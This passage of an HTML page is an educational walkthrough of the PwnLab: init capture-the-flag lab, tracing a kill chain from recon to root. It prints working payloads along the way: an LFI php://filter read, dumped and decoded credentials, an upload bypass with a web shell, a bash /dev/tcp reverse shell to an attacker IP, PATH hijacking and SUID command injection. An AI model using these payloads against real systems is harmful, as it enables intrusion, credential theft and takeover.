+<div style="padding:16px;border-radius:10px;background:rgba(0,255,136,0.04);border:1px solid var(--border);text-align:center">
+<div style="font-family:'JetBrains Mono',monospace;font-size:1.1rem;color:var(--green)">config.php</div>
+<span style="font-size:.75rem;color:var(--text2)">Database credentials expected</span>
+</div>
+<div style="padding:16px;border-radius:10px;background:rgba(0,255,136,0.04);border:1px solid var(--border);text-align:center">
+<div style="font-family:'JetBrains Mono',monospace;font-size:1.1rem;color:var(--green)">upload.php</div>
+<span style="font-size:.75rem;color:var(--text2)">File upload attack surface</span>
+</div>
+<div style="padding:16px;border-radius:10px;background:rgba(0,255,136,0.04);border:1px solid var(--border);text-align:center">
+<div style="font-family:'JetBrains Mono',monospace;font-size:1.1rem;color:var(--green)">include/</div>
+<span style="font-size:.75rem;color:var(--text2)">Inclusion directory for LFI</span>
+</div>
+<div style="padding:16px;border-radius:10px;background:rgba(0,255,136,0.04);border:1px solid var(--border);text-align:center">
+<div style="font-family:'JetBrains Mono',monospace;font-size:1.1rem;color:var(--green)">login.php</div>
+<span style="font-size:.75rem;color:var(--text2)">Authentication endpoint</span>
+</div>
+</div>
+
+<div class="highlight-box warn">
+<h4>Why Attackers Brute-Force Directories</h4>
+<p>Directory bruteforcing reveals hidden attack surfaces that developers never intended to expose. config.php is the jackpot — it almost always contains database credentials or secret keys. In the real world, this is how attackers find admin panels, backup files, and configuration dumps.</p>
+</div>
+</section>
+
+<!-- SECTION 8: PARAMETER DISCOVERY -->
+<section class="section-jump" style="margin-top:80px">
+<h2>Phase 5: Parameter Discovery</h2>
+<p style="color:var(--text2);margin-bottom:24px">Dynamic web pages use parameters to load content. When developers use include() with user-supplied parameters, every value becomes a potential vulnerability. The attacker probes for patterns.</p>
+
+<div class="terminal">
+<div class="terminal-bar"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">parameter fuzzing</span></div>
+<div class="terminal-body">
+<span class="prompt"># </span><span class="cmd">Testing common parameters on index.php</span><br/><br/>
+<span class="output">http://192.168.1.8/index.php?page=test    ← content rendered</span><br/>
+<span class="output">http://192.168.1.8/index.php?page=home    ← content rendered</span><br/>
+<span class="output">http://192.168.1.8/index.php?page=login   ← content rendered</span><br/>
+<span class="output">http://192.168.1.8/index.php?page=about   ← blank/warning</span><br/>
+<br/>
+<span class="highlight">✔ Dynamic file inclusion confirmed</span><br/>
+<span class="comment"># The server loads files based on the ?page= parameter</span><br/>
+<span class="comment"># Pattern: include($_GET['page'] . ".php");</span>
+</div>
+</div>
+
+<div class="insight">
+<div class="insight-label">Critical Understanding</div>
+<h4>"Whenever you see index.php, expect parameters"</h4>
+<p>Parameters like ?page=, ?lang=, ?file=, ?include=, ?template= are attacker magnets. They often map directly to include() or require() calls in PHP. When user input reaches include(), you have Local File Inclusion — a high-severity vulnerability.</p>
+</div>
+</section>
+
+<!-- SECTION 9: LFI -->
+<section class="section-jump" id="lfi-section" style="margin-top:80px">
+<h2>Phase 6: Local File Inclusion (LFI)</h2>
+<p style="color:var(--text2);margin-bottom:24px">When user input controls include(), attackers try to read system files. Direct LFI may fail if PHP blocks execution — but that does not mean the application is safe. Advanced attackers switch techniques.</p>
+
+<div class="terminal">
+<div class="terminal-bar"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">LFI testing</span></div>
+<div class="terminal-body">
+<span class="prompt"># </span><span class="cmd">Basic LFI attempt (direct path traversal)</span><br/>
+<span class="output">?page=../../../../etc/passwd</span><br/>
+<span class="error">✘ Failed — PHP execution blocked</span><br/><br/>
+<span class="comment"># "Failure doesn't mean safe. It means filtered."</span><br/>
+<span class="comment"># Advanced attackers continue with PHP filter abuse...</span>
+</div>
+</div>
+
+<div class="highlight-box">
+<h4>What is LFI?</h4>
+<p>Local File Inclusion occurs when an application uses user-supplied input to load files without proper sanitization. The PHP code <code>include($_GET['page'] . ".php");</code> lets an attacker read /etc/passwd, config files, or source code — anything the web server user can read. In the real world, LFI is a gateway to credential theft, code execution, and full compromise.</p>
+</div>
+</section>
+
+<!-- SECTION 10: PHP FILTER ABUSE -->
+<section class="section-jump" style="margin-top:80px">
+<h2>Phase 7: PHP Filter Abuse</h2>
+<p style="color:var(--text2);margin-bottom:24px">If PHP won't execute malicious files, maybe it will reveal their source. php://filter is a PHP internal stream that reads files and encodes them — bypassing execution entirely.</p>
+
+<div class="terminal">
+<div class="terminal-bar"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">PHP filter exploit</span></div>
+<div class="terminal-body">
+<span class="prompt"># </span><span class="cmd">PHP filter payload to read config.php source</span><br/>
+<span class="highlight">?page=php://filter/convert.base64-encode/resource=config</span><br/><br/>
+<span class="comment"># PHP does NOT execute config — it reads and encodes it</span><br/>
+<span class="output">PD9waHAgLy8gRGF0YWJhc2UgY29uZmlndXJhdGlvbgok...[base64 encoded]</span><br/><br/>
+<span class="success">✔ Source code disclosed via Base64 encoding</span>
+</div>
+</div>
+
+<div style="display:grid;grid-template-columns:1fr;gap:12px;margin:20px 0">
+<div style="padding:16px;border-radius:10px;background:var(--bg3);border:1px solid var(--border);display:flex;align-items:center;gap:12px;flex-wrap:wrap">
+<span style="font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--text2);min-width:120px">Step 1: File Requested</span>
+<span style="font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--green)">→ config.php</span>
+</div>
+<div style="padding:16px;border-radius:10px;background:var(--bg3);border:1px solid var(--border);display:flex;align-items:center;gap:12px;flex-wrap:wrap">
+<span style="font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--text2);min-width:120px">Step 2: PHP Filter Applied</span>
+<span style="font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--green)">→ convert.base64-encode</span>
+</div>
+<div style="padding:16px;border-radius:10px;background:var(--bg3);border:1px solid var(--border);display:flex;align-items:center;gap:12px;flex-wrap:wrap">
+<span style="font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--text2);min-width:120px">Step 3: File Encoded</span>
+<span style="font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--green)">→ PHP source → Base64 string</span>
+</div>
+<div style="padding:16px;border-radius:10px;background:var(--bg3);border:1px solid var(--border);display:flex;align-items:center;gap:12px;flex-wrap:wrap">
+<span style="font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--text2);min-width:120px">Step 4: Source Exposed</span>
+<span style="font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--green)">→ Credentials readable</span>
+</div>
+</div>
+
+<div class="insight">
+<div class="insight-label">Why This Bypasses Execution</div>
+<h4>php://filter is a stream wrapper, not a file loader</h4>
+<p>When PHP sees <code>php://filter/convert.base64-encode/resource=config</code>, it does not execute config.php. Instead, it opens config.php as a resource, applies the Base64 encoding filter, and outputs the encoded result. The PHP code inside config.php never reaches the parser — it is treated as plain text. This bypasses all execution-based security checks.</p>
+</div>
+</section>
+
+<!-- SECTION 11: DATABASE & CREDENTIALS -->
+<section class="section-jump" id="cred-section" style="margin-top:80px">
+<h2>Phase 8: Database Compromise</h2>
+<p style="color:var(--text2);margin-bottom:24px">With the decoded config.php, attackers obtain MySQL credentials. Database access means authentication is broken — every stored credential becomes loot.</p>
+
+<div class="terminal">
+<div class="terminal-bar"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">mysql enumeration</span></div>
+<div class="terminal-body">
+<span class="prompt"># </span><span class="cmd">mysql --host=192.168.1.8 -u root -p -D Users</span><br/><br/>
+<span class="highlight">mysql> SHOW TABLES;</span><br/>
+<span class="output">+-----------------+</span><br/>
+<span class="output">| Tables_in_Users |</span><br/>
+<span class="output">+-----------------+</span><br/>
+<span class="output">| users           |</span><br/>
+<span class="output">+-----------------+</span><br/><br/>
+<span class="highlight">mysql> SELECT * FROM users;</span><br/>
+<span class="output">+----+--------+------------------+</span><br/>
+<span class="output">| id | user   | pass             |</span><br/>
+<span class="output">+----+--------+------------------+</span><br/>
+<span class="output">|  1 | kent   | Sld6WHVCSkpOeQ== |</span><br/>
+<span class="output">|  2 | mike   | aVN2NVltMkdSbw== |</span><br/>
+<span class="output">|  3 | kane   | aVN2NVltMkdSbw== |</span><br/>
+<span class="output">+----+--------+------------------+</span><br/><br/>
+<span class="success">✔ User credentials extracted (Base64 encoded)</span>
+</div>
+</div>
+
+<div class="highlight-box danger">
+<h4>Why Base64 Storage is Insecure</h4>
+<p>Base64 is encoding, not encryption. <code>echo 'Sld6WHVCSkpOeQ==' | base64 -d</code> instantly reveals the plaintext password. Real applications must use bcrypt, Argon2, or PBKDF2 with a salt. Storing passwords as Base64 is equivalent to storing them in plaintext — one decode away from compromise.</p>
+</div>
+
+<div class="b64-visualizer">
+<div class="b64-row"><span class="label" style="color:var(--text2)">Encoded</span><span style="color:var(--yellow)">Sld6WHVCSkpOeQ==</span></div>
+<div class="b64-arrow">▼ base64 -d</div>
+<div class="b64-row"><span class="label" style="color:var(--green)">Decoded</span><span style="color:var(--green)">JWzXuBJJNy</span></div>
+</div>
+
+<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px;margin:16px 0">
+<div style="padding:16px;border-radius:8px;background:var(--bg3);border:1px solid var(--border);text-align:center">
+<div style="font-family:'JetBrains Mono',monospace;color:var(--green)">kent</div>
+<span style="font-size:.75rem;color:var(--text2)">JWzXuBJJNy</span>
+</div>
+<div style="padding:16px;border-radius:8px;background:var(--bg3);border:1px solid var(--border);text-align:center">
+<div style="font-family:'JetBrains Mono',monospace;color:var(--green)">kane</div>
+<span style="font-size:.75rem;color:var(--text2)">iSv5Ym2GRo</span>
+</div>
+<div style="padding:16px;border-radius:8px;background:var(--bg3);border:1px solid var(--border);text-align:center">
+<div style="font-family:'JetBrains Mono',monospace;color:var(--green)">mike</div>
+<span style="font-size:.75rem;color:var(--text2)">iSv5Ym2GRo</span>
+</div>
+</div>
+
+<div class="insight">
+<div class="insight-label">Credential Reuse Risk</div>
+<h4>kane and mike share the same password</h4>
+<p>Password reuse is one of the most common real-world vulnerabilities. When users share passwords across accounts, compromising one user immediately compromises another. This is how attackers pivot laterally inside a network.</p>
+</div>
+</section>
+
+<!-- SECTION 13+14: UPLOAD & RCE -->
+<section class="section-jump" id="upload-section" style="margin-top:80px">
+<h2>Phase 9: File Upload Vulnerability</h2>
+<p style="color:var(--text2);margin-bottom:24px">The application allows image uploads but only checks the file extension, not the actual content. This is one of the most dangerous web vulnerabilities — it turns file upload into remote code execution.</p>
+
+<div class="visualizer">
+<div>
+<div class="terminal">
+<div class="terminal-bar"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">upload bypass</span></div>
+<div class="terminal-body">
+<span class="prompt"># </span><span class="cmd">Application checks only extension</span><br/>
+<span class="output">shell.php  →  Blocked (.php not allowed)</span><br/><br/>
+<span class="prompt"># </span><span class="cmd">Bypass: disguise as image</span><br/>
+<span class="highlight">shell.php.gif  →  Accepted ✓</span><br/><br/>
+<span class="comment"># The server sees .gif but PHP still executes the code inside</span><br/>
+<span class="comment"># Uploaded to: /upload/b1a99ebaad4dd28f57517de36e770484.gif</span>
+</div>
+</div>
+</div>
+<div>
+<div class="insight" style="margin-top:0">
+<div class="insight-label">Extension vs Content</div>
+<h4>The server trusts the extension, not the content</h4>
+<p>Modern applications validate both extension AND content (MIME type, magic bytes). This application only checks the extension. By naming a PHP payload <code>shell.php.gif</code>, the webserver serves it as PHP and executes the embedded code. This is a CRITICAL vulnerability that leads directly to Remote Code Execution.</p>
+</div>
+</div>
+</div>
+</section>
+
+<section class="section-jump" id="rce-section" style="margin-top:60px">
+<h2>Phase 10: Web Shell Execution</h2>
+<p style="color:var(--text2);margin-bottom:24px">The uploaded PHP shell executes when included via the application's file inclusion mechanism. The attacker sets a cookie pointing to the uploaded file and triggers inclusion on index.php load.</p>
+
+<div class="cookie-box">
+<div><span class="key">Cookie Name:</span> <span class="value">lang</span></div>
+<div><span class="key">Cookie Value:</span> <span class="value">../upload/b1a99ebaad4dd28f57517de36e770484.gif</span></div>
+<div style="margin-top:8px;color:var(--text2)">../ → traverse out of current directory</div>
+<div style="color:var(--text2)">/upload/ → reach the uploaded file</div>
+</div>
+
+<div class="terminal">
+<div class="terminal-bar"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">web shell</span></div>
+<div class="terminal-body">
+<span class="prompt"># </span><span class="cmd">Trigger via index.php with cmd parameter</span><br/>
+<span class="output">http://192.168.1.8/index.php?cmd=id</span><br/><br/>
+<span class="highlight">uid=33(www-data) gid=33(www-data)</span><br/><br/>
+<span class="prompt"># </span><span class="cmd">Confirm command execution</span><br/>
+<span class="output">http://192.168.1.8/index.php?cmd=whoami</span><br/>
+<span class="highlight">www-data</span><br/><br/>
+<span class="success">✔ Remote Command Execution (RCE) confirmed</span>
+</div>
+</div>
+
+<div class="insight">
+<div class="insight-label">The Chain So Far</div>
+<h4>User input reached system()</h4>
+<p>The LFI vulnerability let us include arbitrary files. The upload vulnerability let us plant a PHP file on the server. Combined, they let us execute arbitrary system commands. This is the critical turning point — from information disclosure to code execution.</p>
+</div>
+</section>
+
+<!-- SECTION 15: REVERSE SHELL -->
+<section class="section-jump" id="shell-section" style="margin-top:80px">
+<h2>Phase 11: Reverse Shell</h2>
+<p style="color:var(--text2);margin-bottom:24px">A web shell requires sending commands one at a time through the URL. Attackers need an interactive terminal for stable access. A reverse shell makes the victim connect back to the attacker.</p>
+
+<div class="network-anim" id="reverseShellAnim">
+<div class="network-line"></div>
+<div class="network-node attacker"></div>
+<div class="network-node target" style="right:10%"></div>
+<div class="network-pulse" id="animPulse"></div>
+<div id="animPacket" class="network-packet"></div>
+<div style="position:absolute;left:8%;top:40%;font-family:'JetBrains Mono',monospace;font-size:.7rem;color:var(--red)">Attacker<br/>192.168.1.5</div>
+<div style="position:absolute;right:8%;top:40%;font-family:'JetBrains Mono',monospace;font-size:.7rem;color:var(--green)">Victim<br/>192.168.1.8</div>
+</div>
+
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin:20px 0">
+<div class="terminal">
+<div class="terminal-bar"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">attacker — listener</span></div>
+<div class="terminal-body">
+<span class="prompt"># </span><span class="cmd">nc -lvnp 4444</span><br/><br/>
+<span class="output">listening on [any] 4444 ...</span><br/>
+<span class="success">connect to [192.168.1.5] from [192.168.1.8]</span><br/><br/>
+<span class="highlight">www-data@pwnlab:/$</span>
+</div>
+</div>
+<div class="terminal">
+<div class="terminal-bar"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">victim — payload</span></div>
+<div class="terminal-body">
+<span class="prompt"># </span><span class="cmd">Reverse shell one-liner</span><br/>
+<span class="output">bash -c 'bash -i >& /dev/tcp/192.168.1.5/4444 0>&1'</span><br/><br/>
+<span class="comment"># bash -i → interactive shell</span><br/>
+<span class="comment"># /dev/tcp → network connection</span><br/>
+<span class="comment"># >& + 0>&1 → redirect IO through network</span>
+</div>
+</div>
+</div>
+
+<div class="insight">
+<div class="insight-label">Why Reverse Shells</div>
+<h4>"The web app trusted user input. User input reached system(). system() executed Bash. Bash opened a network connection. We caught it using Netcat."</h4>
+<p>A reverse shell gives attackers an interactive terminal with job control, tab completion, and the ability to run commands that require a TTY (su, sudo, editors). This is the standard foothold for privilege escalation.</p>
+</div>
+</section>
+
+<!-- SECTION 16: SHELL STABILIZATION -->
+<section class="section-jump" style="margin-top:80px">
+<h2>Phase 12: Shell Stabilization (TTY Upgrade)</h2>
+<p style="color:var(--text2);margin-bottom:24px">The initial reverse shell works but is unstable — commands like su, sudo, and editors will not function correctly. Attackers must convert it into a fully interactive TTY shell.</p>
+
+<div class="steps">
+<div class="step">
+<h4>Spawn a pseudo-terminal</h4>
+<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code> — Creates a pseudo-terminal on the target, tricking programs into thinking they have a real terminal.</p>
+</div>
+<div class="step">
+<h4>Background the shell</h4>
+<p>Press <code>CTRL + Z</code> on the keyboard to background the current netcat session.</p>
+</div>
+<div class="step">
+<h4>Fix terminal settings (local)</h4>
+<p><code>stty raw -echo</code> — Disables local echo and line buffering so terminal control sequences pass through correctly.</p>
+</div>
+<div class="step">
+<h4>Bring shell back</h4>
+<p><code>fg</code> followed by ENTER restores the backgrounded reverse shell session.</p>
+</div>
+<div class="step">
+<h4>Set terminal type</h4>
+<p><code>export TERM=xterm</code> — Tells the remote shell to use xterm-compatible escape sequences. Optional: <code>reset</code> to clean the terminal state.</p>
+</div>
+<div class="step">
+<h4>Verify interactive TTY</h4>
+<p><code>tty</code> → <code>/dev/pts/0</code> — Confirms the shell is now fully interactive. Commands like su, sudo, vim, and arrow keys work correctly.</p>
+</div>
+</div>
+</section>
+
+<!-- SECTION 17: USER PIVOTING -->
+<section class="section-jump" id="pivot-section" style="margin-top:80px">
+<h2>Phase 13: User Pivoting</h2>
+<p style="color:var(--text2);margin-bottom:24px">The web server runs as www-data — a restricted user. Attackers must move laterally by reusing discovered credentials. Password reuse across accounts enables internal compromise.</p>
+
+<div class="terminal">
+<div class="terminal-bar"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">user enumeration</span></div>
+<div class="terminal-body">
+<span class="prompt">www-data@pwnlab:/$ </span><span class="cmd">id</span><br/>
+<span class="output">uid=33(www-data) gid=33(www-data)</span><br/><br/>
+<span class="prompt">www-data@pwnlab:/$ </span><span class="cmd">ls /home</span><br/>
+<span class="output">kent  kane  mike</span><br/><br/>
+<span class="prompt">www-data@pwnlab:/$ </span><span class="cmd">su kent</span><br/>
+Password: <span class="output">JWzXuBJJNy</span><br/>
+<span class="success">kent@pwnlab:/$</span>
+</div>
+</div>
+
+<div style="display:flex;align-items:center;justify-content:center;gap:12px;padding:24px;flex-wrap:wrap">
+<div style="padding:12px 24px;border-radius:8px;background:rgba(255,51,85,0.1);border:1px solid rgba(255,51,85,0.3);font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--red)">www-data</div>
+<span style="color:var(--green-dark);font-size:1.2rem">▸</span>
+<div style="padding:12px 24px;border-radius:8px;background:rgba(0,255,136,0.06);border:1px solid var(--border);font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--green)">kent</div>
+<span style="color:var(--green-dark);font-size:1.2rem">▸</span>
+<div style="padding:12px 24px;border-radius:8px;background:rgba(0,255,136,0.06);border:1px solid var(--border);font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--green)">kane</div>
+<span style="color:var(--green-dark);font-size:1.2rem">▸</span>
+<div style="padding:12px 24px;border-radius:8px;background:rgba(0,255,136,0.06);border:1px solid var(--border);font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--green)">mike</div>
+</div>
+
+<div class="highlight-box warn">
+<h4>Real-World Password Reuse</h4>
+<p>In corporate environments, users share passwords across services. Compromising one account (kent) gives attackers access to others (kane, mike). This lateral movement is how attackers escalate from low-privileged web access to sensitive internal systems.</p>
+</div>
+</section>
+
+<!-- SECTION 18: PATH HIJACKING -->
+<section class="section-jump" id="privesc-section" style="margin-top:80px">
+<h2>Phase 14: PATH Hijacking</h2>
+<p style="color:var(--text2);margin-bottom:24px">The kane user has a binary called msgmike that calls cat without using an absolute path. When a program runs a command without specifying its full path, Linux searches the PATH environment variable — which attackers can manipulate.</p>
+
+<div class="visualizer">
+<div>
+<div class="terminal">
+<div class="terminal-bar"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">PATH hijack</span></div>
+<div class="terminal-body">
+<span class="prompt">kane@pwnlab:~$ </span><span class="cmd">ls -la</span><br/>
+<span class="output">-rwxr-xr-x 1 kane kane  msgmike</span><br/><br/>
+<span class="prompt">kane@pwnlab:~$ </span><span class="cmd">file msgmike</span><br/>
+<span class="output">msgmike: ELF 64-bit LSB executable</span><br/><br/>
+<span class="prompt">kane@pwnlab:~$ </span><span class="cmd">strings msgmike | grep cat</span><br/>
+<span class="highlight">cat /home/mike/msg.txt</span><span class="error">  ← calls cat without full path!</span><br/><br/>
+<span class="prompt">kane@pwnlab:~$ </span><span class="cmd">cd /tmp</span><br/>
+<span class="prompt">kane@pwnlab:/tmp$ </span><span class="cmd">echo /bin/bash > cat</span><br/>
+<span class="prompt">kane@pwnlab:/tmp$ </span><span class="cmd">chmod 777 cat</span><br/>
+<span class="prompt">kane@pwnlab:/tmp$ </span><span class="cmd">export PATH=/tmp:$PATH</span><br/>
+<span class="prompt">kane@pwnlab:/tmp$ </span><span class="cmd">cd ~ &amp;&amp; ./msgmike</span><br/>
+<span class="success">mike@pwnlab:~$</span><span class="highlight">  ← became user mike!</span>
+</div>
+</div>
+</div>
+<div>
+<div class="insight" style="margin-top:0">
+<div class="insight-label">PATH Hijacking Logic</div>
+<h4>When msgmike calls "cat", Linux searches PATH in order</h4>
+<p>1. msgmike executes <code>cat /home/mike/msg.txt</code></p>
+<p>2. Linux searches each directory in PATH for an executable named "cat"</p>
+<p>3. Since PATH starts with /tmp, Linux finds our malicious "cat" first</p>
+<p>4. Our "cat" contains <code>/bin/bash</code> — so the binary launches a shell</p>
+<p>5. The shell inherits the binary's privileges → we become mike</p>
+</div>
+<div style="margin-top:16px;padding:16px;border-radius:10px;background:var(--bg3);border:1px solid var(--border)">
+<div style="font-family:'JetBrains Mono',monospace;font-size:.7rem;text-transform:uppercase;letter-spacing:.08em;color:var(--green-dim);margin-bottom:8px">Why Relative Commands Are Dangerous</div>
+<p style="font-size:.85rem;color:var(--text2)">Using <code>cat</code> instead of <code>/bin/cat</code> means the program trusts the user's PATH environment variable. Any user can modify their PATH. This is a design flaw — the binary should always use absolute paths. In the real world, this vulnerability is found in cron jobs, system scripts, and SUID binaries.</p>
+</div>
+</div>
+</div>
+</section>
+
+<!-- SECTION 19: SUID EXPLOITATION -->
+<section class="section-jump" style="margin-top:80px">
+<h2>Phase 15: SUID Exploitation</h2>
+<p style="color:var(--text2);margin-bottom:24px">As user mike, we find a root-owned SUID binary called msg2root. SUID (Set User ID) means the binary runs with the file owner's privileges — in this case, root. Combined with an unsafe system() call, this is a direct path to root.</p>
+
+<div class="suid-box">
+<span class="suid-highlight">-rwsr-sr-x</span> <span style="color:var(--text)">1 root root</span> <span style="color:var(--green)">msg2root</span>
+<span style="display:block;color:var(--text2);font-size:.75rem;margin-top:4px">SUID bit set (s in owner execute position) → runs as root</span>
+</div>
+
+<div class="terminal">
+<div class="terminal-bar"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">SUID exploitation</span></div>
+<div class="terminal-body">
+<span class="prompt">mike@pwnlab:~$ </span><span class="cmd">./msg2root</span><br/>
+<span class="output">Message for root: </span><span class="highlight">hello && /bin/sh</span><br/>
+<span class="output">Message sent successfully</span><br/>
+<span class="highlight"># ← root shell obtained</span><br/><br/>
+<span class="prompt"># </span><span class="cmd">id</span><br/>
+<span class="highlight">uid=1002(mike) euid=0(root)</span><br/><br/>
+<span class="comment"># uid = real user (mike)</span><br/>
+<span class="comment"># euid = effective user (root) ← full root privileges</span>
+</div>
+</div>
+
+<div class="insight">
+<div class="insight-label">SUID + Unsafe system() = Root</div>
+<h4>How msg2root is exploited</h4>
+<p>The binary uses <code>system()</code> to send the message, passing user input directly to a shell. The command injection payload <code>hello && /bin/sh</code> executes the legitimate message send AND then launches a shell. Because the binary is SUID root, the new shell also runs as root. This is a classic command injection vulnerability in a privileged context.</p>
+</div>
+</section>
+
+<!-- SECTION 20: ROOT COMPROMISE -->
+<section class="section-jump" id="root-section" style="margin-top:80px">
+<h2>Phase 16: Root Compromise</h2>
+<p style="color:var(--text2);margin-bottom:24px">Effective UID root means full system compromise. The attacker can now read any file, kill any process, and fully control the machine.</p>
+
+<div class="terminal">
+<div class="terminal-bar"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">root flag</span></div>
+<div class="terminal-body">
+<span class="prompt"># </span><span class="cmd">/bin/cat /root/flag.txt</span><br/><br/>
+<span class="highlight">.-=~=-.                                                                 .-=~=-.</span><br/>
+<span class="highlight">(__  _)-=_  PwnLab.init - Root Flag  _=-_( _  __)</span><br/>
+<span class="highlight">    '~'  If you are reading this, means that you have break 'init'  '~'</span><br/>
+<span class="highlight">          Pwnlab. From Web Application to Root Shell.</span><br/>
+<span class="highlight">          Congratulations!</span><br/><br/>
+<span class="success">✔ System fully compromised</span><br/>
+<span class="success">✔ Root access achieved</span>
+</div>
+</div>
+
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin:20px 0">
+<div style="padding:20px;border-radius:10px;background:var(--bg3);border:1px solid var(--border)">
+<div class="label" style="margin-bottom:6px">UID vs EUID</div>
+<p style="font-size:.85rem;color:var(--text2)"><strong>UID</strong> (Real User ID) = who you logged in as (mike, 1002). <strong>EUID</strong> (Effective User ID) = what privileges you have (root, 0). When a SUID binary runs, the EUID becomes the binary's owner. The kernel uses EUID for permission checks, so EUID=root means full system access.</p>
+</div>
+<div style="padding:20px;border-radius:10px;background:var(--bg3);border:1px solid var(--border)">
+<div class="label" style="margin-bottom:6px">Why /bin/cat</div>
+<p style="font-size:.85rem;color:var(--text2)">We use <code>/bin/cat</code> (absolute path) instead of just <code>cat</code> because the PATH was previously hijacked. Using the full path ensures we call the real cat binary and safely read the flag file. This is a best practice even for attackers.</p>
+</div>
+</div>
+</section>
+
+</div>
+</section>
+
+<!-- SECTION 21: FULL CHAIN VISUALIZATION -->
+<section class="section section-dark" style="padding:80px 0">
+<div class="container">
+<div class="section-title">
+<div class="label" style="margin-bottom:8px">Complete Kill Chain</div>
+<h2>Attack Chain Visualization</h2>
+<p>Every vulnerability chained together, from first recon to root flag. No single bug was enough — the real danger comes from chaining small weaknesses.</p>
+</div>
+
+<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:8px;max-width:1000px;margin:0 auto">
+<div style="padding:16px;border-radius:8px;border:1px solid var(--border);background:var(--card);text-align:center">
+<div style="font-family:'Orbitron',sans-serif;font-size:1.5rem;color:var(--text3);margin-bottom:4px">01</div>
+<div style="font-size:.75rem;color:var(--green)">Recon</div>
+</div>
+<div style="padding:16px;border-radius:8px;border:1px solid var(--border);background:var(--card);text-align:center">
+<div style="font-family:'Orbitron',sans-serif;font-size:1.5rem;color:var(--text3);margin-bottom:4px">02</div>
+<div style="font-size:.75rem;color:var(--green)">Enumeration</div>
+</div>
+<div style="padding:16px;border-radius:8px;border:1px solid var(--border);background:var(--card);text-align:center">
+<div style="font-family:'Orbitron',sans-serif;font-size:1.5rem;color:var(--text3);margin-bottom:4px">03</div>
+<div style="font-size:.75rem;color:var(--green)">LFI</div>
+</div>
+<div style="padding:16px;border-radius:8px;border:1px solid var(--border);background:var(--card);text-align:center">
+<div style="font-family:'Orbitron',sans-serif;font-size:1.5rem;color:var(--text3);margin-bottom:4px">04</div>
+<div style="font-size:.75rem;color:var(--green)">Cred Leak</div>
+</div>
+<div style="padding:16px;border-radius:8px;border:1px solid var(--border);background:var(--card);text-align:center">
+<div style="font-family:'Orbitron',sans-serif;font-size:1.5rem;color:var(--text3);margin-bottom:4px">05</div>
+<div style="font-size:.75rem;color:var(--green)">DB Access</div>
+</div>
+<div style="padding:16px;border-radius:8px;border:1px solid var(--border);background:var(--card);text-align:center">
+<div style="font-family:'Orbitron',sans-serif;font-size:1.5rem;color:var(--text3);margin-bottom:4px">06</div>
+<div style="font-size:.75rem;color:var(--green)">Upload Bypass</div>
+</div>
+<div style="padding:16px;border-radius:8px;border:1px solid var(--border);background:var(--card);text-align:center">
+<div style="font-family:'Orbitron',sans-serif;font-size:1.5rem;color:var(--text3);margin-bottom:4px">07</div>
+<div style="font-size:.75rem;color:var(--green)">RCE</div>
+</div>
+<div style="padding:16px;border-radius:8px;border:1px solid var(--border);background:var(--card);text-align:center">
+<div style="font-family:'Orbitron',sans-serif;font-size:1.5rem;color:var(--text3);margin-bottom:4px">08</div>
+<div style="font-size:.75rem;color:var(--green)">Reverse Shell</div>
+</div>
+<div style="padding:16px;border-radius:8px;border:1px solid var(--border);background:var(--card);text-align:center">
+<div style="font-family:'Orbitron',sans-serif;font-size:1.5rem;color:var(--text3);margin-bottom:4px">09</div>
+<div style="font-size:.75rem;color:var(--green)">User Pivot</div>
+</div>
+<div style="padding:16px;border-radius:8px;border:1px solid var(--border);background:var(--card);text-align:center">
+<div style="font-family:'Orbitron',sans-serif;font-size:1.5rem;color:var(--text3);margin-bottom:4px">10</div>
+<div style="font-size:.75rem;color:var(--green)">PATH Hijack</div>
+</div>
+<div style="padding:16px;border-radius:8px;border:1px solid var(--border);background:var(--card);text-align:center">
+<div style="font-family:'Orbitron',sans-serif;font-size:1.5rem;color:var(--text3);margin-bottom:4px">11</div>
+<div style="font-size:.75rem;color:var(--green)">SUID Abuse</div>
+</div>
+<div style="padding:16px;border-radius:8px;border:1px solid var(--green);background:rgba(0,255,136,0.06);text-align:center">
+<div style="font-family:'Orbitron',sans-serif;font-size:1.5rem;color:var(--green);margin-bottom:4px">12</div>
+<div style="font-size:.75rem;color:var(--green)">ROOT</div>
+</div>
+</div>
+
+<div class="highlight-box" style="margin-top:40px;text-align:center">
+<h4>The Kill Chain Principle</h4>
